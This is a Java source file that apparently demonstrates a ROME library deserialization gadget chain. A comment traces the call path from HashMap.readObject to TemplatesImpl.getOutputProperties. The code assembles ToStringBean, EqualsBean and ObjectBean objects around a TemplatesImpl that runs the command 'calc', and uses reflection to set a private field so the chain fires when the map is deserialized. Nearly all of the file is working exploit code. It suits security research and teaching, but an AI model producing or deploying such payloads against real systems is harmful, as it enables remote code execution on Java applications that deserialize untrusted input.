package Seri.RomeGadgets;

import Seri.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import org.jdom.transform.XSLTransformer;

import javax.xml.transform.Templates;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;

import static Seri.Utils.*;

/**
 *
 * TemplatesImpl.getOutputProperties()
 * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
 * NativeMethodAccessorImpl.invoke(Object, Object[])
 * DelegatingMethodAccessorImpl.invoke(Object, Object[])
 * Method.invoke(Object, Object...)
 * ToStringBean.toString(String)
 * ToStringBean.toString()
 * ObjectBean.toString()
 * EqualsBean.beanHashCode()
 * ObjectBean.hashCode()
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)
 *
 */

public class RomeDemo {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = Utils.createTemplatesImpl("calc");

        ToStringBean toStringBean = new ToStringBean(Templates.class,templates);
        ToStringBean fakeToStringBean = new ToStringBean(Templates.class,new TemplatesImpl());

        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);

        ObjectBean objectBean = new ObjectBean(ToStringBean.class ,fakeToStringBean);
        setValue(objectBean,"_equalsBean",equalsBean);

        HashMap map = new HashMap();
        map.put(objectBean,123);

//        serialize(map ,"bin/RomeEqualsBean.bin");
//        unserialize("bin/RomeEqualsBean.bin");


    }
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
